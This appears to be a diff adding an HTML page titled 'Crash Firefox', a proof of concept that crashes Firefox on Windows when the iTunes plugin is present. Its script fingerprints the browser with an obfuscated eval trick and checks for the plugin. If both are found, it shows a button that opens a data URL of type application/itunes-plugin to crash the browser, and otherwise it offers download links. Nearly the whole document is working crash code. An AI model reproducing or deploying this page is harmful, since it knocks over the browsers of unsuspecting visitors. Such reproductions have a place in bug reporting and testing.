@@ -1,0 +1,78 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html>
+<head>
+<title>Crash Firefox</title>
+</head>
+<body>
+<script type="application/x-javascript">
+/*<![CDATA[*/
+var crashBtn = document.createElement('input');
+crashBtn.setAttribute('type', 'button');
+crashBtn.setAttribute('id', 'crashbtn');
+
+var itunes = false, crasher, ff = false;
+const NULL = null;
+
+function crashFF()
+{
+	var crasher = window.open('data:application/itunes-plugin,','crasher','width=0,height=0');
+	crasher.close();
+}
+
+for (var i=0; i<navigator.plugins.length; i++)
+{
+	if ( typeof navigator.plugins[i].name != 'undefined' && navigator.plugins[i].name == 'iTunes Application Detector' )
+	{
+		itunes = true;
+	}
+}
+
+try { // Will work until other browsers start supporting e4x, sharp vars, and non-standard globalStorage and safari stops letting you delete constants
+//to check for 1.5+ use this:
+	eval("ff = (({'e4x':#0=[,<e4x supported={true}/>..@supported=='true'], '@-1':#0#, '@-2':!#0#}).@[uneval(~(delete NULL))][1])");
+//check for ff 2+
+//	eval("ff = (({'e4x':#0=[,<e4x supported={true}/>..@supported=='true'], '@-1':#0#, '@-2':!#0#}).@[uneval(~(delete NULL))][1] && typeof globalStorage != 'undefined')");
+}
+catch (e) {
+	ff = false;
+}
+
+if ( typeof window.songbird != 'undefined' )
+{
+	ff = false;
+}
+
+if ( navigator.appVersion.toLowerCase().indexOf("win")!=-1 )
+{
+
+if ( itunes == true && ff == true )
+{
+	crashBtn.setAttribute('onclick', "crashFF()");
+	crashBtn.setAttribute('value', 'Crash Firefox');
+}
+else if ( itunes == false && ff == true )
+{
+	crashBtn.setAttribute('onclick', "location.href='http://www.apple.com/itunes/download/'");
+	crashBtn.setAttribute('value', 'Install iTunes');
+}
+else if ( itunes == true && ff == false )
+{
+	crashBtn.setAttribute('onclick', "location.href='http://getfirefox.com/'");
+	crashBtn.setAttribute('value', 'Install Firefox');
+}
+else
+{
+	crashBtn.setAttribute('onclick', "window.open('http://getfirefox.com/');location.href='http://www.apple.com/itunes/download/'");
+	crashBtn.setAttribute('value', 'Install Firefox and iTunes');
+}
+
+}
+else
+{
+	crashBtn.setAttribute('value', 'This is a Windows-only Bug');
+}
+document.body.appendChild(crashBtn);
+/*]]>*/
+</script>
+</body>
+</html>
